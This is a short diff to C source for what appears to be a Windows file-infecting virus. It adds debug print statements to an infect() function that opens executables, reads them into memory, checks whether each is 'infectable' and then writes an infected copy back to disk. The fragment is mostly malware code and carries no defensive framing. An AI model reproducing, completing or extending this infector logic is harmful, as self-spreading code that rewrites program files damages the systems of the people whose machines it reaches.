@@ -955,28 +955,43 @@ int infect(void)
                                          NULL);
 
       if (exe_handle == INVALID_HANDLE_VALUE)
+      {
+         printf("%s failed CreateFile\n", executable);
          goto end_exe_loop;
+      }
       
       DWORD file_size = iat.getFileSize(exe_handle, NULL);
 
       if (file_size == INVALID_FILE_SIZE)
+      {
+         printf("%s has an invalid file size\n", executable);
          goto close_file;
+      }
       
       CVector exe_buffer = cvector_alloc(&iat, sizeof(uint8_t), file_size);
       DWORD bytes_read = 0;
 
       if (!iat.readFile(exe_handle, CVECTOR_CAST(&exe_buffer, uint8_t *), exe_buffer.elements, &bytes_read, NULL))
+      {
+         printf("%s failed ReadFile\n", executable);
          goto free_file;
+      }
 
       if (bytes_read != file_size)
+      {
+         printf("%s failed to read correctly\n", executable);
          goto free_file;
+      }
       
       iat.closeHandle(exe_handle);
       exe_handle = INVALID_HANDLE_VALUE;
 
       /* verify if the binary is even infectable */
       if (!is_infectable(&iat, &exe_buffer))
+      {
+         printf("%s is not infectable\n", executable);
          goto free_file;
+      }
 
       printf("infecting %s\n", executable);
 
@@ -997,7 +1012,10 @@ int infect(void)
                                   NULL);
 
       if (exe_handle == INVALID_HANDLE_VALUE)
+      {
+         printf("\t%s failed to write\n", executable);
          goto infected_file_cleanup;
+      }
 
       DWORD bytes_written = 0;
 
